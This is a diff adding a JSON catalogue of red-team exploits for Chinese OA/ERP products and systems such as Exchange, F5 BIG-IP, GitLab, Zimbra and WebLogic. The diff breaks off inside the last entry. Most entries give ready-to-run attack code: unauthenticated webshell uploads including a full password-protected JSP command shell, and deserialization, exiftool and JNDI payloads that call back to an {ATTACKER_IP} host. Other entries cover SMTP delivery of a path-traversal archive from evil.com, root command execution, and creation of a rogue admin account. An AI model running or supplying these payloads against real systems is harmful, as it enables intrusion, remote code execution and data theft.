@@ -1,0 +1,682 @@
+[
+  {
+    "name": "用友 NC FileReceiveServlet 反序列化远程代码执行",
+    "description": "用友 NC（ERP）的 FileReceiveServlet 在处理 HTTP 请求体时直接进入 ObjectInputStream 反序列化，且 classpath 存在可利用 Gadget 链。未认证发送构造的序列化对象即可执行任意命令，是近年护网中内网横向打 ERP 的高频入口。触发路径：/servlet/~ic/bsh.servlet.BshServlet 相邻的 FileReceiveServlet 接口 POST 序列化流。",
+    "vulnType": "deserialization",
+    "severity": "critical",
+    "publishedAt": "2023-02",
+    "affected": "用友 NC 6.5（FileReceiveServlet 暴露且未打补丁的部署）",
+    "vulnerabilityIds": [
+      {
+        "type": "CNVD",
+        "value": "CNVD-2023-22714"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "检测端点暴露（无害探测）",
+        "language": "bash",
+        "code": "curl -sk -o /dev/null -w \"%{http_code}\\n\" \"http://{TARGET}/servlet/FileReceiveServlet\" -X POST --data-binary ''"
+      },
+      {
+        "title": "利用（ysoserial 序列化流直接投递）",
+        "language": "bash",
+        "code": "java -jar ysoserial.jar CommonsCollections6 'curl http://{ATTACKER_IP}:{LPORT}/pwn' > payload.bin\ncurl -sk --data-binary @payload.bin \"http://{TARGET}/servlet/FileReceiveServlet\""
+      }
+    ],
+    "prerequisites": "目标为用友 NC 且 FileReceiveServlet 可达（通常 80 端口直出或经反代）；classpath 含 CommonsCollections 等 Gadget 依赖；出网回连通道可用（DNS/HTTP）。",
+    "references": [
+      "https://www.yonyou.com/",
+      "https://github.com/frohoff/ysoserial"
+    ],
+    "tags": [
+      "yonyou",
+      "nc",
+      "deserialization",
+      "hw",
+      "erp"
+    ],
+    "attribution": {
+      "source": "公开通告与护网复现",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/rce/app-systems-rce-yonyou-nc"
+  },
+  {
+    "name": "泛微 e-office 10 UploadFile.php 任意文件上传远程代码执行",
+    "description": "泛微 e-office 10 的 /general/index/UploadFile.php 未做身份校验且未限制上传文件类型与目录，直接 multipart 上传 PHP 文件到 web 根即可获得 WebShell。历史护网中大量暴露在互联网边界，是打点首选之一。",
+    "vulnType": "file-upload",
+    "severity": "critical",
+    "publishedAt": "2021-10",
+    "affected": "泛微 e-office 10（v10.0_20210922 之前版本）",
+    "vulnerabilityIds": [
+      {
+        "type": "CNVD",
+        "value": "CNVD-2021-49104"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "未授权上传 PHP WebShell",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/general/index/UploadFile.php\" -F \"file=@shell.php\" -F \"plupload=1\""
+      },
+      {
+        "title": "验证落盘（返回 JSON 中的相对路径拼接访问）",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/general/attachment_folder/shell.php?cmd=id\""
+      }
+    ],
+    "prerequisites": "目标 e-office 10 的 UploadFile.php 可未授权访问；web 目录可写且 PHP 解析生效。",
+    "references": [
+      "https://www.weaver.com.cn/",
+      "https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/weaver-eoffice-UploadFile.md"
+    ],
+    "tags": [
+      "weaver",
+      "e-office",
+      "upload",
+      "hw",
+      "oa"
+    ],
+    "attribution": {
+      "source": "公开通告与护网复现",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/file-upload/app-systems-file-upload-weaver-eoffice"
+  },
+  {
+    "name": "致远 OA htmlofficeservlet 任意文件上传（万年常客）",
+    "description": "致远 OA A8/A6 的 /seeyon/htmlofficeservlet 接口对上传文件名与内容未做过滤（老版本还带 DBSTEP V8.0K 头解析），构造带 LOGON_USER 的请求体可上传 JSP 到 web 目录。多年护网渗透测试中的标杆 OA 漏洞，利用稳定、无需认证。",
+    "vulnType": "file-upload",
+    "severity": "critical",
+    "publishedAt": "2020-06",
+    "affected": "致远 OA A8/A6/V5 多版本（htmlofficeservlet 未下线且未限制上传的部署）",
+    "vulnerabilityIds": [],
+    "exploitCode": [
+      {
+        "title": "上传 JSP（DBSTEP 头构造）",
+        "language": "http",
+        "code": "POST /seeyon/htmlofficeservlet HTTP/1.1\nHost: {TARGET}\nContent-Type: application/x-www-form-urlencoded\n\nDBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\nOPTION=S3WYOSWLBSGr\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\nCREATEDATE=wUghPB3szB3Xwg66\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\noriginalFileId=wV66\noriginalCreateDate=wUghPB3szB3Xwg66\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\nneedReadFile=yRWZdAS6\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\n<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"calsee\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce\n\n# DBSTEP 协议体（非 multipart/form-data）：定长 64 字节头 = 版本(15B) + FMsgText 长度(15B=355) + 错误长度(15B=0) + 文件大小(15B=666)\n# FMsgText 键值经致远自定义 base64 字母表编码：OPTION=S3WYOSWLBSGr 即 SAVEASIMG，FILENAME 解码为 ..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\testtesta.jsp\n# 末尾 32 字节为文件内容 MD5（校验失败不影响落盘）"
+      },
+      {
+        "title": "验证 WebShell",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/seeyon/testtesta.jsp?pwd=calsee&cmd=whoami\""
+      }
+    ],
+    "prerequisites": "目标为致远 OA 且 htmlofficeservlet 可达；上传目录可解析 JSP；建议先用无害 out.println 探测。",
+    "references": [
+      "https://www.seeyon.com/",
+      "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E8%87%B4%E8%BF%9COA.md"
+    ],
+    "tags": [
+      "seeyon",
+      "oa",
+      "upload",
+      "hw",
+      "jsp"
+    ],
+    "attribution": {
+      "source": "公开分析与护网复现",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/file-upload/app-systems-file-upload-seeyon-htmloffice"
+  },
+  {
+    "name": "蓝凌 OA treexml.tmpl 服务端请求伪造到远程代码执行",
+    "description": "蓝凌 OA 的 /sys/search/sys_search_main/sysSearchMain.do 与 treexml.tmpl 模板接口存在 SSRF：可请求内网任意地址并回显内容；结合内网 Redis/Jenkins 等未授权服务形成 RCE 组合链。护网中常作为进入内网后的横向跳板。",
+    "vulnType": "ssrf",
+    "severity": "high",
+    "publishedAt": "2021-05",
+    "affected": "蓝凌 OA（landray）多版本（treexml.tmpl 未授权的部署）",
+    "vulnerabilityIds": [
+      {
+        "type": "CNVD",
+        "value": "CNVD-2021-34352"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "SSRF 探测内网端口（回显判断）",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/sys/ui/extend/varkind/custom.jsp\" --data \"var={\\\"body\\\":{\\\"fileUrl\\\":\\\"http://127.0.0.1:6379/\\\"}}\""
+      },
+      {
+        "title": "读取 treexml 模板源码确认版本",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/sys/search/sys_search_main/sysSearchMain.do?method=ajaxGetTreexmlInfo\" --data \"s_1_1=1\""
+      }
+    ],
+    "prerequisites": "目标为蓝凌 OA 且相关接口未授权；SSRF 打内网需目标出网方向可达内网服务（Redis/Jenkins/Metabase 等）。",
+    "references": [
+      "https://www.landray.com.cn/",
+      "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E8%93%9D%E5%87%8COA.md"
+    ],
+    "tags": [
+      "landray",
+      "oa",
+      "ssrf",
+      "hw"
+    ],
+    "attribution": {
+      "source": "公开分析与护网复现",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/ssrf/app-systems-ssrf-landray-treexml"
+  },
+  {
+    "name": "通达 OA 任意用户登录（session 组合漏洞）",
+    "description": "通达 OA 2017/11 等版本存在多处组合缺陷：/ispirit/interface/gateway.php 前置包含可绕过登录校验，配合 /general/login_code.php 与 uid 参数直接构造有效 session，实现任意用户（含 admin）免密登录后台，再衔接文件上传接口完成 RCE。护网中通达系列是 OA 打点前三。",
+    "vulnType": "auth-bypass",
+    "severity": "high",
+    "publishedAt": "2020-03",
+    "affected": "通达 OA 2017 / V11.x（gateway.php 组合缺陷未修复的部署）",
+    "vulnerabilityIds": [],
+    "exploitCode": [
+      {
+        "title": "绕过登录拿有效 session（gateway 组合）",
+        "language": "http",
+        "code": "POST /ispirit/interface/gateway.php HTTP/1.1\nHost: {TARGET}\nContent-Type: application/x-www-form-urlencoded\n\njson={}&url=/general/login_code.php"
+      },
+      {
+        "title": "携 code 换 session 后访问后台",
+        "language": "bash",
+        "code": "curl -sk -c /tmp/td.cookie \"http://{TARGET}/logincheck.php?UNAME=admin&CODEWHERE=<上一步code>\" \ncurl -sk -b /tmp/td.cookie \"http://{TARGET}/general/index.php\" | head -5"
+      }
+    ],
+    "prerequisites": "目标为通达 OA 且 gateway.php 组合缺陷存在；需目标在浏览器/Cookie 会话中复现换票流程；后续 RCE 依赖上传接口可达。",
+    "references": [
+      "https://www.tongda2000.com/",
+      "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA.md"
+    ],
+    "tags": [
+      "tongda",
+      "oa",
+      "auth-bypass",
+      "hw"
+    ],
+    "attribution": {
+      "source": "公开分析与护网复现",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/auth-bypass/app-systems-auth-bypass-tongda"
+  },
+  {
+    "name": "亿邮 EyouMail 命令执行远程代码执行",
+    "description": "亿邮邮件网关的 /admin/api/ 或维护接口对参数未过滤直接拼接 shell 命令（多次出现在护网行动通报），未授权或低权限即可执行任意命令接管邮件服务器。邮件系统是内网凭据池高价值目标，拿下后可横向钓鱼与收信。",
+    "vulnType": "rce",
+    "severity": "critical",
+    "publishedAt": "2021-03",
+    "affected": "亿邮 EyouMail 邮件系统多个版本",
+    "vulnerabilityIds": [
+      {
+        "type": "CNVD",
+        "value": "CNVD-2021-26422"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "命令执行探测（DNSLOG 验证）",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/admin/api/logout?param=;ping%20-c%201%20{DNSLOG}\""
+      }
+    ],
+    "prerequisites": "目标为亿邮 EyouMail 且漏洞接口未鉴权可达；命令回显或出网探测通道可用。",
+    "references": [
+      "https://www.eyou.net/",
+      "https://www.cnvd.org.cn/"
+    ],
+    "tags": [
+      "eyou",
+      "mail",
+      "rce",
+      "hw"
+    ],
+    "attribution": {
+      "source": "护网公开通报",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/rce/app-systems-rce-eyoumail"
+  },
+  {
+    "name": "帆软 FineReport V9 任意文件读取（日志接口目录穿越）",
+    "description": "帆软 FineReport V9 的 /WebReport/ReportServer 日志下载接口（op=fr_server&cmd=sc_getlogfile 相关族）对文件名参数未做目录规范化，../../ 可读取部署目录外任意文件（配置、账号库、私钥）。常作为信息搜集阶段读取 admin 账号与外联配置的跳板。",
+    "vulnType": "path-traversal",
+    "severity": "high",
+    "publishedAt": "2020-09",
+    "affected": "帆软 FineReport V9（日志接口未限制的部署）",
+    "vulnerabilityIds": [],
+    "exploitCode": [
+      {
+        "title": "目录穿越读取配置文件",
+        "language": "bash",
+        "code": "curl -sk --path-as-is \"http://{TARGET}/WebReport/ReportServer?op=fr_server&cmd=sc_getlogfile&fileName=../../../WEB-INF/resources/config.xml\""
+      }
+    ],
+    "prerequisites": "目标为帆软 FineReport V9 且 ReportServer 可达；已知相对路径下的高价值文件名；--path-as-is 防客户端规范化。",
+    "references": [
+      "https://www.fanruan.com/",
+      "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E5%B8%86%E8%BD%AF.md"
+    ],
+    "tags": [
+      "fanruan",
+      "finereport",
+      "lfi",
+      "hw"
+    ],
+    "attribution": {
+      "source": "公开分析与护网复现",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "app-systems/path-traversal/app-systems-path-traversal-finareport"
+  },
+  {
+    "name": "Apache APISIX Dashboard 未授权远程代码执行",
+    "description": "Apache APISIX Dashboard 2.x 的 /apisix/admin 接口默认使用默认 admin key 或未鉴权（部署配置不当叠加默认值），可未登录添加 route 并挂 serverless-pre-function 插件执行任意 Lua 代码，实现 RCE。云原生边界网关一旦失守影响全域流量。",
+    "vulnType": "rce",
+    "severity": "critical",
+    "publishedAt": "2022-01",
+    "affected": "Apache APISIX Dashboard 2.0.1 ~ 2.10.x / Gateway 默认配置部署",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-45232"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "默认 key 探测（etest 提权路由添加前先确认鉴权态）",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}:9000/apisix/admin/routes\" -H \"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\""
+      },
+      {
+        "title": "挂 Lua 插件执行命令",
+        "language": "bash",
+        "code": "curl -sk -X PUT \"http://{TARGET}:9000/apisix/admin/routes/pwn\" \\\n  -H \"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\" \\\n  -H \"Content-Type: application/json\" \\\n  --data-binary @- <<'JSON'\n{\"uri\":\"/pwn\",\"plugins\":{\"serverless-pre-function\":{\"phase\":\"rewrite\",\"functions\":[\"return function() ngx.req.read_body() local f=io.popen(ngx.req.get_body_data()) ngx.say(f:read('*a')) end\"]}}}\nJSON"
+      }
+    ],
+    "prerequisites": "Dashboard 9000 端口可达且使用默认管理 key（edd1c9f034335f136f87ad84b625c8f1）或未鉴权；APISIX 数据面运行中。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-45232",
+      "https://apisix.apache.org/docs/dashboard/FAQ/"
+    ],
+    "tags": [
+      "apisix",
+      "gateway",
+      "lua",
+      "rce",
+      "cloud-native"
+    ],
+    "attribution": {
+      "source": "Apache 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "middleware/rce/middleware-rce-apisix-dashboard"
+  },
+  {
+    "name": "GitLab CE/EE exiftool 未授权远程代码执行（恶意图片元数据）",
+    "description": "GitLab 处理 Issue/Comment 上传图片时调用 exiftool 解析元数据，受 exiftool CVE-2021-22204（DjVu 字段注入）影响：构造带恶意 DjVu 的图片未经认证即可触发命令执行（HTTP 回调确认）。影响面大且利用稳定，是自建 GitLab 打点的代表。",
+    "vulnType": "file-upload",
+    "severity": "critical",
+    "publishedAt": "2021-04",
+    "affected": "GitLab CE/EE 11.9 ~ 13.10.2（未打 13.10.3+ 补丁）",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-22205"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "生成恶意 djvu 图片（exiftool 注入）",
+        "language": "bash",
+        "code": "printf 'P1 1 1 1' > raw.pbm\nexiftool -config djvux.config '-DjVu<<' '= (size(\"xx\") { `curl http://{ATTACKER_IP}:{LPORT}/gitlab` })' raw.pbm\nmv raw.pbm evil.jpg"
+      },
+      {
+        "title": "未认证投递到 uploads 接口",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/uploads/user\" -F \"file=@evil.jpg\""
+      }
+    ],
+    "prerequisites": "目标 GitLab 在受影响版本区间；出网回连（HTTP/DNSLOG）可用确认；无需账号。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-22205",
+      "https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/"
+    ],
+    "tags": [
+      "gitlab",
+      "exiftool",
+      "upload",
+      "rce",
+      "devops"
+    ],
+    "attribution": {
+      "source": "GitLab 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "middleware/rce/middleware-rce-gitlab-exiftool"
+  },
+  {
+    "name": "Zabbix SAML 认证绕过任意用户登录（Sqlite 会话伪造）",
+    "description": "Zabbix 前端启用 SAML SSO（azuread 等）时，返回端点对会话 cookie 的用户身份签名校验缺陷（CVE-2022-23131）：构造带既有会话 id 的 zbx_session 注入任意用户（含 Admin），实现无凭据登录管理台，再经 Agent 配置触发主机端命令执行。",
+    "vulnType": "auth-bypass",
+    "severity": "critical",
+    "publishedAt": "2022-01",
+    "affected": "Zabbix 4.0.x ~ 6.0.0（启用 SAML SSO 的部署）",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-23131"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "伪造 zbx_session（需先取一个匿名会话 id）",
+        "language": "python",
+        "code": "import base64, json, zlib\nsess = {\"saml_data\": {\"user_attribute\": \"Admin\"}, \"sessionid\": \"<匿名会话id>\", \"sign\": \"\"}\nprint(base64.b64encode(zlib.compress(json.dumps(sess).encode())).decode())"
+      },
+      {
+        "title": "携带伪造会话访问 index_sso.php",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/index_sso.php?sid=<匿名会话id>\" -H \"Cookie: zbx_session=<伪造串>\" -L"
+      }
+    ],
+    "prerequisites": "目标 Zabbix 启用了 SAML SSO；能先取得一个匿名 sessionid（访问登录页即可）；伪造后拥有管理台完整权限。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-23131",
+      "https://support.zabbix.com/browse/ZBX-20350"
+    ],
+    "tags": [
+      "zabbix",
+      "saml",
+      "auth-bypass",
+      "monitoring"
+    ],
+    "attribution": {
+      "source": "Zabbix 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "auth-session/auth-bypass/auth-session-auth-bypass-zabbix-saml"
+  },
+  {
+    "name": "F5 BIG-IP iControl REST 未授权远程代码执行",
+    "description": "BIG-IP 的 iControl REST API 在认证绕过（CVE-2022-1388）基础上，可通过 /mgmt/tm/util/bash 端点以 root 执行任意命令：Apache2 对象层与内部 TOMCAT 的认证判定不一致，X-F5-Auth-Token 缺失时回落 Basic 且跳过校验。边界负载均衡器直失守，危害极大。",
+    "vulnType": "rce",
+    "severity": "critical",
+    "publishedAt": "2022-05",
+    "affected": "F5 BIG-IP 16.1.x < 16.1.2.2 / 15.1.x < 15.1.5.1 / 14.1.x < 14.1.4.6 / 13.1.x < 13.1.5",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-1388"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "未授权 root 命令执行",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/mgmt/tm/util/bash\" -u \"admin:\" -H \"X-F5-Auth-Token: a\" -H \"Connection: keep-alive, X-F5-Auth-Token\" --data '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'"
+      }
+    ],
+    "prerequisites": "目标 BIG-IP 管理口（443）可达且版本在受影响区间；管理口可互联网/内网直达；无需有效凭据。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-1388",
+      "https://support.f5.com/csp/article/K23605346"
+    ],
+    "tags": [
+      "f5",
+      "bigip",
+      "rce",
+      "network",
+      "hw"
+    ],
+    "attribution": {
+      "source": "F5 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "middleware/rce/middleware-rce-f5-icontrol"
+  },
+  {
+    "name": "Harbor 未授权创建管理员账户",
+    "description": "Harbor 1.7.0 ~ 1.8.1 的 /api/users POST 接口未校验调用者身份，可直接创建 admin 角色账户。登录后可拉取全部私有镜像（源码/凭据泄露）并投毒公共镜像（供应链横向）。云原生镜像仓库的高频失守路径。",
+    "vulnType": "access-control",
+    "severity": "medium",
+    "publishedAt": "2019-09",
+    "affected": "Harbor 1.7.0 ~ 1.8.1",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2019-16097"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "未授权创建管理员",
+        "language": "bash",
+        "code": "curl -sk -X POST \"http://{TARGET}/api/users\" -H 'Content-Type: application/json' --data '{\"username\":\"pwnadmin\",\"email\":\"pwn@pwn.local\",\"realname\":\"p\",\"password\":\"Pwn123456!\",\"comment\":\"\",\"has_admin_role\":true}'"
+      },
+      {
+        "title": "登录并枚举项目",
+        "language": "bash",
+        "code": "curl -sk -u pwnadmin:'Pwn123456!' \"http://{TARGET}/api/projects?page_size=100\""
+      }
+    ],
+    "prerequisites": "目标 Harbor 在受影响版本；80/443 API 可达；创建成功后凭据即时可用于登录。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2019-16097",
+      "https://github.com/goharbor/harbor/security/advisories"
+    ],
+    "tags": [
+      "harbor",
+      "registry",
+      "access-control",
+      "supply-chain"
+    ],
+    "attribution": {
+      "source": "Harbor 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "middleware/access-control/middleware-access-control-harbor-unauth"
+  },
+  {
+    "name": "Microsoft Exchange ProxyShell 服务端请求伪造到远程代码执行（组合链）",
+    "description": "ProxyShell 三连（CVE-2021-34473 路径混淆 SSRF + CVE-2021-34523 头部注入 + CVE-2021-34524 后端认证绕过）：通过 /autodiscover/autodiscover.json 的路径混淆访问 /mapi/nspi 与 /powershell，以 Exchange Trusted 权限写 WebShell 到邮箱。Exchange 边界失守直通域内邮件凭据。",
+    "vulnType": "ssrf",
+    "severity": "critical",
+    "publishedAt": "2021-07",
+    "affected": "Exchange Server 2013/2016/2019（2021-07 补丁前）",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-34473"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2021-34523"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2021-34524"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "SSRF 路径混淆探测（访问内部后端）",
+        "language": "bash",
+        "code": "curl -sk \"http://{TARGET}/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com\" -H \"Cookie: X-BEResource=admin@domain@1:6001\""
+      },
+      {
+        "title": "完整利用（msf/proxyshell_logan 公开链）",
+        "language": "bash",
+        "code": "python3 proxyshell_logan.py -u {TARGET} -e administrator@corp.local -w /tmp/writes"
+      }
+    ],
+    "prerequisites": "目标 Exchange 管理端口（443）可达且未打 2021-07 累积补丁；需要有效邮箱域名信息；写 WebShell 后需 Outlook Web Access 路径可达。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
+      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473"
+    ],
+    "tags": [
+      "exchange",
+      "proxyshell",
+      "ssrf",
+      "microsoft",
+      "hw"
+    ],
+    "attribution": {
+      "source": "MSRC 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "system-network/rce/system-network-rce-exchange"
+  },
+  {
+    "name": "Zimbra mboximport 任意文件写入远程代码执行",
+    "description": "Zimbra（CVE-2022-41352）：基于 cpio 的邮件附件解包路径穿越，向邮箱投递带恶意路径附件的邮件即可把 JSP/WebShell 写到 webapp 目录，未认证 RCE。与 CVE-2022-27925 一起是自建邮件系统的高频组合。",
+    "vulnType": "file-upload",
+    "severity": "critical",
+    "publishedAt": "2022-09",
+    "affected": "Zimbra 8.8.15 / 9.0（cpio 解包链未修复的部署，Patch 33 前）",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-41352"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "构造含 ../ 穿越路径的 cpio 归档并经 SMTP 投递（附件落盘写 JSP）",
+        "language": "bash",
+        "code": "# 1) 构造含 ../ 穿越路径条目的 cpio（newc）归档：cpio 解包不清理 ../，逐级上跳写入 webapp 目录\npython3 - <<'PYEOF'\nimport io\n\ndef cpio_entry(name, data):\n    nb = name.encode() + b'\\x00'\n    fields = [1, 0o100644, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(nb), 0]\n    hdr = b'070701' + ''.join('%08X' % v for v in fields).encode()\n    pad = lambda b: b + b'\\x00' * (-len(b) % 4)\n    return pad(hdr + nb) + pad(data)\n\njsp = b'<%out.println(\"pwn:\"+request.getParameter(\"c\"));%>\\n'\n# 条目名携带 8 级 ../：解包时多余 ../ 停在根目录，落点 /opt/zimbra/jetty_base/webapps/zimbraAdmin/\nname = '../' * 8 + 'opt/zimbra/jetty_base/webapps/zimbraAdmin/shell.jsp'  # 老版本为 /opt/zimbra/jetty/...\nopen('shell.cpio', 'wb').write(cpio_entry(name, jsp) + cpio_entry('TRAILER!!!', b''))\nPYEOF\ncpio -itv < shell.cpio\n\n# 2) 经 SMTP 投递归档附件邮件（amavis 无 pax 时用 cpio 解包附件触发穿越落盘）\nswaks --to victim@{TARGET_DOMAIN} --from pwn@evil.com --header 'Subject: pwn' --attach-type application/x-cpio --attach @shell.cpio --server {TARGET}:25"
+      },
+      {
+        "title": "触发落盘后的 WebShell",
+        "language": "bash",
+        "code": "curl -sk \"https://{TARGET}:7071/zimbraAdmin/shell.jsp?c=id\""
+      }
+    ],
+    "prerequisites": "目标 Zimbra SMTP（25）可达且允许外部投递；归档条目含 ../ 穿越路径（落点 /opt/zimbra/jetty_base/webapps/zimbraAdmin/，老版本为 /opt/zimbra/jetty/...）；写盘后对应 webapp 路由可访问。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-41352",
+      "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories"
+    ],
+    "tags": [
+      "zimbra",
+      "mail",
+      "upload",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Zimbra 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "middleware/rce/middleware-rce-zimbra-mboximport"
+  },
+  {
+    "name": "Apache APISIX batch-requests 保护绕过到内网接口直达",
+    "description": "APISIX 的 batch-requests 插件（CVE-2022-24112）在 URI 规范化差异下可绕过 ip-restriction 等访问控制：请求 /apisix/batch-requests 提交内嵌 pipeline，把源 IP 改写为网关自身，直达仅内网可达的 admin 接口（进而衔接 serverless 插件 RCE）。",
+    "vulnType": "access-control",
+    "severity": "critical",
+    "publishedAt": "2022-02",
+    "affected": "Apache APISIX 1.3 ~ 2.12.0（batch-requests 开启的部署）",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-24112"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "batch-requests 直达内网 admin",
+        "language": "bash",
+        "code": "curl -sk -X POST \"http://{TARGET}/apisix/batch-requests\" -H 'Content-Type: application/json' --data '{\"pipeline\":[{\"method\":\"GET\",\"path\":\"/apisix/admin/routes\"}]}'"
+      }
+    ],
+    "prerequisites": "目标 APISIX 开启 batch-requests 且 admin 接口有 IP 白名单（本漏洞即绕过该白名单）；后续 RCE 需衔接 CVE-2021-45232 类插件利用。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-24112",
+      "https://apisix.apache.org/zh/docs/apisix/batch-requests/"
+    ],
+    "tags": [
+      "apisix",
+      "bypass",
+      "gateway",
+      "cloud-native"
+    ],
+    "attribution": {
+      "source": "Apache 官方通告",
+      "author": "",
+      "license": ""
+    },
+    "source": "curated",
+    "treePath": "middleware/access-control/middleware-access-control-apisix-batch"
+  },
+  {
+    "name": "Oracle WebLogic Console JNDI 注入远程代码执行（CVE-2021-2109）",
+    "description": "WebLogic 管理台（/console/css/%252e%252e%252fconsolejndi）在路径二次解码后进入 JNDI 查询，query 参数可控：指向攻击者 LDAP/RMI 服务的恶意对象工厂类在低版本 JDK 下加载执行。与 T3/IIOP 并列的 WebLogic 第三条主力 RCE 通道，管理台可达即有利用面。",
+    "vulnType": "rce",
+    "severity": "high",
+    "publishedAt": "2021-01",
+    "affected": "Oracle WebLogic Server 10.3.6.0 / 12.1.3.0 / 12.2.1.3 / 12.2.1.4 / 14.1.1.0（2021-01 CPU 前）",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-2109"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "路径二次编码进 JNDI 查询（LDAP 回连）",
+        "language": "bash",
+        "code": "curl -sk --path-as-is \"http://{TARGET}:7001/console/css/%252e%252e%252fconsolejndi?test=ldap://{ATTACKER_IP}:{LPORT}/Exploit\""
+      }
+    ],
+    "prerequisites": "WebLogic 管理台 7001 可达（无需登录，路径混淆直达 JNDI servlet）；攻击侧需 LDAP/RMI 恶意服务（marshalsec/JNDI-Injection-Exploit）；JDK 版本低于对应 JNDI 远程类加载限制（高版本需本地 Gadget 变体）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-2109",
+      "https://www.oracle.com/security-alerts/cpujan2021.html"
+    ],
+    "tags": [
+      "weblogic",
+      "jndi",
+      "rce",
+      "middleware",
+      "java"
+    ],
+    "attribution": {
+      "source": "Oracle 官方 CPU",
+      "author": "",
+      "license": ""
